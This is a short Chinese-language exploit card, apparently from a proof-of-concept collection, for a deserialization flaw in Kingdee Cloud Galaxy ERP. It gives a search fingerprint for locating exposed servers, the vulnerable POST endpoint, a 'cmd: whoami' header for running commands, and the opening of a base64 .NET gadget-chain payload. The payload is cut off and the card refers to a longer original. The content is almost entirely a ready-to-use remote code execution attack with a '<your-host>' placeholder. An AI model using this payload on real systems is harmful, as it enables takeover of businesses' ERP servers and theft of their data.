# 金蝶云星空K3CloudRecordCurDevCodeInfo.common.kdsvc存在反序列化漏洞

- **系统**：金蝶　|　**类型**：反序列化　|　**CVE**：—
- **指纹**：`body="HTML5/content/themes/kdcss.min.css"`
- **请求**：`POST /K3Cloud/Kingdee.BOS.ServiceFacade.ServicesStub.AppDesigner.AppDesignerService.RecordCurDevCodeInfo.common.kdsvc HTTP/1.1`
- **关键头**：`Host: <your-host>`　`Content-Type: application/json`　`cmd: whoami`

**请求体 / payload**
```
{"ap0":"AAEAAAD/////AQAAAAAAAAAEAQAAAH9TeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5MaXN0YDFbW1N5c3RlbS5PYmplY3QsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dAwAAAAZfaXRlbXMFX3NpemUIX3ZlcnNpb24FAAAICAkCAAAACgAAAAoAAAAQAgAAABAAAAAJAwAAAAkEAAAACQUAAAAJBgAAAAkHAAAACQgAAAAJCQAAAAkKAAAACQsAAAAJDAAAAA0GBwMAAAABAQAAAAEAAAAHAgkNAAAADA4AAABhU3lzdGVtLldvcmtmbG93LkNvbXBvbmVudE1vZGVsLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49MzFiZjM4NTZhZDM2NGUzNQUEAAAAalN5c3RlbS5Xb3JrZmxvdy5Db21wb25lbnRNb2RlbC5TZXJpYWxpemF0aW9uLkFjdGl2aXR5U3Vycm9n…（脚本共 15651 字，完整版见原文）
```
- **预期**：200　|　—